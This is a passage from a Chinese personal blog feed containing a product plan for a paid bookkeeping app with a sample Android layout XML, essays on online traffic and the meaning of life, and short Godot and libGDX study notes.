        <content type="html"><![CDATA[<p>多多理财是我开发的一款付费用户理财软件，使用多多理财记录每一次消费，让自己变得更加优秀。</p><p>本软件同时支持Android 和 IOS ，导出导入数据也是互通的。</p><p>英文名称:PersistoAestus 意味着持续 持久</p><h1 id="美术UI"><a href="#美术UI" class="headerlink" title="美术UI"></a>美术UI</h1><p>美术是至关重要的一环，现如今的社会人们都追求所谓的潮流，时尚，可能在我眼中，觉得还是土，但是极高的艺术造诣绝对会有人买单的，基础功能是一回事，能够把基础功能开发出炫酷牛逼的风格是一门艺术，就像回合制战斗游戏有很多都一样，为什么P5天下第一，除了他自研发的那些经典功能，最主要的是牛逼的艺术风格，让整个代码都感觉更快更好。</p><p>按钮</p><p>选择框</p><p>开屏树</p><h1 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h1><h2 id="记账"><a href="#记账" class="headerlink" title="记账"></a>记账</h2><p>基本记账功能，和公司记账的精细程度不一样，日常中我们普通人的记账习惯和方式。</p><h3 id="详细记账"><a href="#详细记账" class="headerlink" title="详细记账"></a>详细记账</h3><p>在记账的基础上，添加更加详细的内容，如记账时间，购买东西的分类，详细内容等等，这里可以参考一些记账的技巧，然后我认为需要根据选择不同人群记账的习惯和内容完全不一样。</p><p>目前想添加的数据有：日期时间 物品分类</p><h2 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h2><p>理财的重要性和一些关于理财的知识，我会参考很多理财的书籍，比如《小狗钱钱》、《小岛经济学》、《富爸爸穷爸爸》等等等，做成像是多邻国那样的益智游戏。</p><p>这方面的教学可能采取会员制度。</p><h2 id="生成报表"><a href="#生成报表" class="headerlink" title="生成报表"></a>生成报表</h2><p>记账的数据可以生成各种不同的图表，柱状图，饼图等等，并且可以导出成为PPT和EXCEL表格等格式。</p><h2 id="多端互连"><a href="#多端互连" class="headerlink" title="多端互连"></a>多端互连</h2><p>如果家庭的所有成员都需要记账，那么可以将多个账本互联，展示家庭的支出收入状况。</p><p>和PC端连接可以传递数据，备份数据。</p><p>可以通过特殊的服务器版本，将账本传递到服务器端，自动更新账本并且按照提前设计好的图标展示方式进行展示，在家庭或者公司局域网内，可以通过ip地址访问，也就是IIS互通。</p><h2 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h2><p>服务器端如上述所说，是用来在局域网中部署自己的网站，通过不断更新数据，展示数据，所有局域网内的设备都可以访问页面查看。</p><h3 id="API接入"><a href="#API接入" class="headerlink" title="API接入"></a>API接入</h3><p>在这一阶段的用户都是具有一定规模的资产，需要更加方便的管理，这里通过设计好接口，方便接入数据，然后生成各种报表方便展示。</p><h2 id="累积"><a href="#累积" class="headerlink" title="累积"></a>累积</h2><p>这是一个直观可视化的美化功能，一些直观展现坚持和累积的东西可以让人不断坚持下去，比如有一些记账软件会加入一个记账持续时间，随着这个数字越来越大，会让人更有坚持下去的欲望，或者是一些签到也是同理。</p><p>而我想要通过一些美术手段来让这个过程更加可视化和持续，比如根据随着记账的时间变多，背景也不断改变，有一种，看的书越来越多，身后堆的书也越来越多，回过头看来，真的很壮观，如同山峦一样。</p><h2 id="定位地图"><a href="#定位地图" class="headerlink" title="定位地图"></a>定位地图</h2><p>如果允许打开定位权限，那么可以每次记账的时候记录经纬度，在最后展示数据的时候有一个位置图。</p><p>用来告诉你在哪个地方消费多，这个图很直观，通过颜色划分。</p><p>当然我会说明，这个记录是保存在本地的，可以关闭，也不会影响使用。</p><p>作为付费软件，我推出三个消费档次</p><p>初期用户 —— 20元</p><p>身为第一批使用这个软件的用户，20块将永久获得这个软件的使用会员，包括以后的会员更新，加入会员群，向开发者（也就是我）提出建议，我会按照需求不管优化软件和增加新的功能。</p><p>包月用户 —— 6元</p><p>6块，可以买两瓶饮料，喝一杯奶茶，但6块，也可以养成一个好习惯，每天记录你的生活花销，让你的生活更加美好</p><p>包季用户 —— 18元 </p><p>很显然，你已经决定好要理财了。</p><h1 id="市场分析"><a href="#市场分析" class="headerlink" title="市场分析"></a>市场分析</h1><p>鲨鱼记账 —— 华为应用商店 下载量:4亿+</p><p>支持微信登陆等</p><h2 id="蓝海："><a href="#蓝海：" class="headerlink" title="蓝海："></a>蓝海：</h2><p>目前我认为，如果想让这个软件市场场景变好，需要的是一整个软件生态和好的开发者环境，生态意味着，一个单纯的记账软件是没有意义的，比如现在有很多人开店，需要记账，用的是乱七八糟的系统，和扫码，我希望这个店家的记账系统，是可以和手机上的，或者其他终端连接的。</p><p>比如：手机上除了自己的日常开销，还可以看到自己店铺的收益，然后哪个商品买的快和好，那些不行都一目了然。</p><p>第二：商品过程中需要扫码对货，因为价格层次不齐不可能全部都记住，如果有一个出货码的机器，可以给商品贴标，然后扫码就能读取价格和打印保存订单，那么就能解决这些问题。</p><p>第三:所有家庭或者公司的记账本的联动，快速分析生成报表。</p><p>第四：构建强大的生态环境和口碑，然后拓展市场，不止作为简单记账，更可以衍生出理财，增值服务。</p><p>第五：合作，富人的标志，通过和其他软件合作，可以验证数据，然后给自己增加一个徽章代表有钱。</p><h2 id="会员构成"><a href="#会员构成" class="headerlink" title="会员构成"></a>会员构成</h2><h3 id="VIP会员"><a href="#VIP会员" class="headerlink" title="VIP会员"></a>VIP会员</h3><p>年卡会员 119元 相当于9.9/月</p><p>季卡会员 50元 相当于16/月</p><p>月卡会员 18元</p><h3 id="免广告会员"><a href="#免广告会员" class="headerlink" title="免广告会员"></a>免广告会员</h3><p>年卡会员 12元 相当于1/月</p><p>季卡会员 9元 相当于3/月</p><p>月卡会员 3元 相当于3/月</p><h3 id="体验版会员"><a href="#体验版会员" class="headerlink" title="体验版会员"></a>体验版会员</h3><p>为了收集反馈看情况发放</p><p>可以通过邀请好友或者积分兑换获得体验版会员，积分则需要完成使用任务</p><p>会员特权:</p><h1 id="软件构成"><a href="#软件构成" class="headerlink" title="软件构成"></a>软件构成</h1><p>软件分为会员服务和白嫖服务</p><p>特点:</p><h2 id="保护隐私"><a href="#保护隐私" class="headerlink" title="保护隐私"></a>保护隐私</h2><p>软件的数据存储在本地，不会上传到云端，防止账本泄露。</p><h2 id="快速保存"><a href="#快速保存" class="headerlink" title="快速保存"></a>快速保存</h2><p>如何保存账本，或者换手机防止账本丢失，可以一键发送，自动将账本压缩为文档通过通信软件提前保存。</p><p>通过固定好的excel表格，可以相互转换，比如需要将账本下载到PC，可以使用软件快速转换并且发送给好友。</p><p>这excel表格是固定的格式，这样就可以实现相互转换。同理可以转换为word文档，PPT等等等</p><p>需要解决问题</p><p>1.如何收款</p><p>2.限额问题</p><p>3.如何确保不是非法集资</p><p>4.相关API调用</p><p>5.做出特色，我希望理财软件和多邻国一样，让人有打开的欲望，而不是一堆看不懂的冰冷数字</p><p>6.国外市场考虑？如何实现汇率转换，如何解决账户问题？查询国外国内银行卡相关知识。</p><p>7.增加针对不同人不同的记账方式。</p><h1 id="新的想法"><a href="#新的想法" class="headerlink" title="新的想法"></a>新的想法</h1><p>NFC功能？</p><p>通过一些现实的硬件设备让理财更加安全和简单，将数据存储到硬件中，通过NFC可以上传，然后这个硬件自带一个WEB，接入家里的局域网就可以通过各种终端设备访问。</p><p>通过网页访问，或者通过软件访问</p><h1 id="模板XML"><a href="#模板XML" class="headerlink" title="模板XML"></a>模板XML</h1><h2 id="初版"><a href="#初版" class="headerlink" title="初版"></a>初版</h2><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">"http://schemas.android.com/apk/res-auto"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/main"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">".MainActivity"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/titanic_Layout"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:orientation</span>=<span class="string">"vertical"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"#ffffff"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">tools:ignore</span>=<span class="string">"MissingConstraints"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">com.romainpiel.titanic.library.TitanicTextView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">"@+id/titanic_tv"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:text</span>=<span class="string">"@string/loading"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:textColor</span>=<span class="string">"#212121"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:textSize</span>=<span class="string">"70sp"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:textStyle</span>=<span class="string">"italic"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">tools:ignore</span>=<span class="string">"MissingConstraints"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    &lt;com.example.financing.TextViewLain--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:id="@+id/tv_one"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:layout_width="0dp"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:layout_height="wrap_content"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:background="#3488B5"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:ellipsize="marquee"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:focusable="true"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:focusableInTouchMode="true"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:gravity="center"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:marqueeRepeatLimit="marquee_forever"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:singleLine="true"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:text="@string/lain"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:textColor="@color/black"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:textSize="24sp"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        android:textStyle="italic"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        app:layout_constraintEnd_toEndOf="parent"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        app:layout_constraintStart_toStartOf="parent"--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        app:layout_constraintTop_toTopOf="parent" /&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/edit_text"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">"40dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">"输入金额"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">"@id/tv_one"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/btn_sum"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"100dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"60dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"#4BC0FF"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"添加"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">"#FFFFFF"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintHorizontal_bias</span>=<span class="string">"0.5"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">"@id/edit_text"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/text_num"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">"@id/btn_sum"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ScrollView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"0dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">"@id/text_num"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">"@+id/main_line"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_marginTop</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:orientation</span>=<span class="string">"vertical"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">tools:layout_editor_absoluteX</span>=<span class="string">"0dp"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:text</span>=<span class="string">"添加数据"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!-- Add more views here if needed --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ScrollView</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>流量</title>
      <link href="/NANABLOG/2024/04/15/%E6%B5%81%E9%87%8F/"/>
      <url>/NANABLOG/2024/04/15/%E6%B5%81%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<p>流量，这个时代最常听到的词汇，似乎人们很反感这个词汇，流量明星，流量网红，流量商品，有些人为了获得流量甚至去买，似乎流量=钱。</p><p>虽然流量不能直接给你钱，但是拥有流量似乎不是一件坏事，如果有合适的转换方案，就可以化作源源不断的资金链。</p><h2 id="流量的诞生"><a href="#流量的诞生" class="headerlink" title="流量的诞生"></a>流量的诞生</h2><p>想要获得流量需要创作，俗称内容，这个时代有内容的人无所畏惧，好的内容自然会被认可，然后带来巨大的流量。</p><p>这是最初的流量，内容为王，但随着内容的不断创作，似乎投机倒把更容易获得流量，这取决于网友环境。</p><h2 id="引流"><a href="#引流" class="headerlink" title="引流"></a>引流</h2><p>流量越来越大，很多人不知道怎么使用这股巨大的能量，有些人看到后试图通过在他人的内容底下引流，以此获得收益。</p><p>比如，在一则引发焦虑的视频底下，大多数人都苦恼和迷茫，这时候自己创作的内容正是解决焦虑的，所以在视频地下进行引流，从而让一部分人看到自己的内容，最后带来收益。</p><p>这种引流方法非常看重目标群体，需要精准的内容产生引流更容易实现变现。</p><h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><p>内容是什么，内容即使让他人满足，要不是为了便利，要不是为了精神，或者物理上或者精神上，产生不同价值。</p><p>情绪价值或许是割韭菜最常用到的，因为产生情绪价值有很多的捷径，但在我看来产生情绪价值很难，我的意思是产生纯正的情绪价值，或者称之为情感价值。</p><p>物理价值则需要给用户提供一些便利，亦或者丰富了他人的生活，亦或者给他人提供了机械化的便利让人们愿意买单。</p><p>不论是那种，都需要用户的认可，这种认可对于群体管用，但真正是否有意义，则取决于他人的看法，像是之前00后很火的情绪价值贩卖，爱英斯坦的脑子，只需要0.5元，在旁人看来，买这个的人本身就是一个没脑子的人，但是销量却达到了10w+，这说明什么，难道真的会发货吗，商家也标注这是一个玩笑，但依然有人愿意付费，这就是情绪价值的作用，人们愿意相信和付出，和本身物品的实际价值关联性并不高。</p><p>而且目前真正内容的市场已经变得濒临破碎，好的内容逐渐隐藏，会员化。出圈则是出殡。</p><p>我本来做游戏也是希望最终形成一个固定的玩家群体，达到一定体量后就足够了。这样高质量的玩家群体产出的内容才更有意义和价值。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 商业 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>生命与价值</title>
      <link href="/NANABLOG/2024/03/30/%E7%94%9F%E5%91%BD%E4%B8%8E%E4%BB%B7%E5%80%BC/"/>
      <url>/NANABLOG/2024/03/30/%E7%94%9F%E5%91%BD%E4%B8%8E%E4%BB%B7%E5%80%BC/</url>
      
        <content type="html"><![CDATA[<p>在人的一生当中，我们总是会追问自己，人生的意义何在，第一次追问，是在被人欺负的时候，那时候还小，意气用事，突然觉得不想活了，这时候觉得人生没意义，所以拿得起放得下，很勇，很大程度上敢于这样做的原因，我认为是阅历太浅，本身还没有赋予什么价值，所以更加容易放弃。</p><p>再然后，慢慢的，长大了，经历了很多事情，有家人，朋友，同学，毕业后，第二次思考起人生的意义，因为感到迷茫，找不到生活的方向，这时候家人，朋友，同学，会给你指明道路，但他们能为你带来的，也只是他们认为最好的罢了。</p><p>最后，你也成人，经历了社会的风风雨雨，步入末年，再次思考起人生的意义，回想起曾经的点点滴滴，或心酸，或高兴，但穷尽一生，依旧没能明白人生的意义是什么，还是会茫然。</p><p>摇摇晃晃数十载年，却获得不明不白，到底哪里出错了？意义又何在？</p><p>有时候会抱怨起富人，憎恨阶级，后悔没有能力，如果出生在好人家该多好？</p><p>那些修仙的人嘴里总是重复出现一个词语“道”，老君也常说：“大道无形，生育天地；大道无情，运行日月；大道无名，长养万物”，再者，人们也常说： “条条大路通罗马”、“行行出状元”这种话，这些看似没有关系的语句，所说的道理和蕴含其中意义，都是无形的，虚的。</p><p>而人的实的，当实人去感受虚物，那么当然是让人感到迷茫了。</p><p>虽然说是“虚的”，但不代表不存在，只是他们所存在的世界，我们是进不去的，相对来说，在虚的眼中，看我们也是一样的，相对于虚的实，和相对于实的虚。</p><p>正反面，是我们人类自古以来最先感受到的东西，我们会理所应当的喜欢对称的图形，也是这个原因。</p><p>回到开头，那么这一切又和人生的意义有什么关联呢？，这就要说一说价值了，价值是我们衡量一切的单位，价值也是虚的，因为它看不见摸不着，但我们却无时无刻的使用着。</p><p>比如去帮某人做事，会得到相应的奖励也会承担风险，这时候就要衡量价值，如果奖励大于风险，那么则乐意于帮助，反之则拒绝。</p><p>长时间以来，不断的交易不断的帮助，形成一套人生的价值观，这个价值观也是虚的，但是我们却对它唯命是从，从不怀疑，从不反抗。</p><p>在二十世纪的人们看来，假如我支付十万块需要你为我工作一个月，那么你会很乐意的帮助我，因为这个时代人们的价值观，这样的工作是极好的，因为当时的工资普遍都是3000元——6000元之间，那么我换个说法，我用十万块买你一个月的生命，这样看来，仿佛有所抵触，感觉生命的重量好像比起十万块更大一些，明明所作的都是同一件事情，但是为什么前者人们更能接收，这就是价值观在作祟，也是富人和穷人最大的不同，以及其背后虚幻的真正的敌人。</p><p>在我这些年的人生当中，有一句话是我自己总结的，我不知道有没有那个人和我说过同样的话。</p><p>“人生最大的敌人就是自己，最需要警惕的则是身边的朋友”</p><p>之前看过姜文的一段访谈，他说过，人生就像是织毛衣，你本来是一条直线，然后你和其他人接触，最后弯曲，然后变成一件衣服穿在身上，没了它你还会感到冷，但不要忘记，你是直的，其实你可以自己选择的，你可以选择不和他们在一起，去和其他人，织成一块布，或者干脆不织了。</p><p>越是厉害的人，越是保持自己的直线，不与他人交织相融，还有些人自立山头，也没什么不好的。</p><p>人离不开环境，环境容易改变人</p><p>朋友会帮助人，但其实会害了你</p><p>家人要你听从，其实让你也同化</p><p>你变得迷茫，你也不是你自己</p><p>最后，我想借用功夫熊猫里面的一个片段，阿宝想要成为神龙大侠，师傅将最强的秘籍交给他，但是里面什么都没有，大家很恐慌，觉得世界上根本没有最强的秘籍，但阿宝却明白，当秘籍照应出他的脸时候，他成为了他自己，他于自己达成和解</p><p>“我是谁？一只鹅的儿子？还是一只熊猫的孩子？一个师傅？还是一个徒弟？答案是我都是，我就是神龙大侠”</p>]]></content>
      
      
      
        <tags>
            
            <tag> 感想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GdScript学习笔记</title>
      <link href="/NANABLOG/2024/03/29/GdScript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2024/03/29/GdScript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>GdScript是一个弱类型语言，所以比较自由，在学习本语言前，建议学习一门强类型语言，在入门时更加容易上手和理解。</p><h2 id="周期"><a href="#周期" class="headerlink" title="周期"></a>周期</h2><p>_init() 初始化调用</p><p>_ready() 开始调用一次</p><p>_process(delta) 每帧调用 delta参数是定义间隔 比如你要每三帧执行一次那么 delta就更改成3</p><h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><p>在Godot中，我发现通过写脚本，可以控制你导入的素材属性，比如写一个方法改变素材的位置，你在界面化中可以更改属性参数来改变，在脚本中，可以调用素材属性方法来改变，两者唯一不同是，拖拽的改法只能在当前使用，而写到脚本中后，每次调用脚本都可以改变位置，通过写一个复杂的方法，来实现人物的位置移动，然后通过调用素材的帧动画，来实现人物显示和移动，说白了，就是播放和停止，移动和返回，使用脚本快速完成游戏框架的构建，并且为了以后的优化和补丁，写一个Mod系统，直接使用脚本调用配置文件就可以完成增加人物或者是武器即可，在脚本中将所有的怪物生成，人物，武器数值不要固定化，有一个配置文件专门保存数据，每次只需要导入相应的类和方法读取就可以。</p><h2 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h2><p>通过查看性能统计 Profile 、监视器 Monitor、内存管理 free，可以快速发现某些史山代码，然后减少调用次数，或者回收方法，来让内存恢复。</p><h2 id="着色器"><a href="#着色器" class="headerlink" title="着色器"></a>着色器</h2><p>使用着色器可以对一个精灵进行一些改变</p><h3 id="顶点着色器"><a href="#顶点着色器" class="headerlink" title="顶点着色器"></a>顶点着色器</h3><h3 id="片段着色器"><a href="#片段着色器" class="headerlink" title="片段着色器"></a>片段着色器</h3>]]></content>
      
      
      
        <tags>
            
            <tag> GdScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>libGDX开发笔记</title>
      <link href="/NANABLOG/2024/03/06/libGDX%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2024/03/06/libGDX%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="框架创建"><a href="#框架创建" class="headerlink" title="框架创建"></a>框架创建</h1><p>官网:<a href="https://libgdx.com/wiki/start/setup">https://libgdx.com/wiki/start/setup</a></p><p>根据教程选择编辑器，创建环境变量，下载框架生成器</p><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><h2 id="图片资源文件"><a href="#图片资源文件" class="headerlink" title="图片资源文件"></a>图片资源文件</h2><h2 id="音频资源文件"><a href="#音频资源文件" class="headerlink" title="音频资源文件"></a>音频资源文件</h2><h2 id="游戏逻辑开发文件"><a href="#游戏逻辑开发文件" class="headerlink" title="游戏逻辑开发文件"></a>游戏逻辑开发文件</h2><h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2>]]></content>
      
      
      
        <tags>
            
            <tag> libGDX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>再施加压力我就似游戏策划案</title>
      <link href="/NANABLOG/2024/03/05/%E5%9C%A8%E6%96%BD%E5%8A%A0%E5%8E%8B%E5%8A%9B%E6%88%91%E5%B0%B1%E4%BC%BC%E6%B8%B8%E6%88%8F%E7%AD%96%E5%88%92%E6%A1%88/"/>
      <url>/NANABLOG/2024/03/05/%E5%9C%A8%E6%96%BD%E5%8A%A0%E5%8E%8B%E5%8A%9B%E6%88%91%E5%B0%B1%E4%BC%BC%E6%B8%B8%E6%88%8F%E7%AD%96%E5%88%92%E6%A1%88/</url>
      
